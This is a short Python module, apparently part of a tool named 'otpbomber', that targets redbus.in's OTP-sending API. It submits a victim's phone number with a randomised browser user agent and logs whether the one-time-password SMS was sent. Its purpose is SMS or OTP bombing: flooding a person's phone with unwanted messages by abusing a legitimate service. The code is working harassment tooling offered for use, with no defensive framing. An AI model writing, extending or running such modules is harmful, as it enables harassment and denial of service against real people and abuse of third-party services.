from otpbomber.core import *
from otpbomber.localuseragent import *

async def redbus(phone, client, out):
    name = 'redbus'
    domain = 'redbus.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Content-Type': 'application/json', 'Referer': 'https://www.redbus.in/'}
    json_data = {'mobile': f'{phone[-10:]}', 'countryCode': '92'}
    try:
        response = await client.post('https://www.redbus.in/api/sendOtp', headers=headers, json=json_data)
        if response.status_code == 200:
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})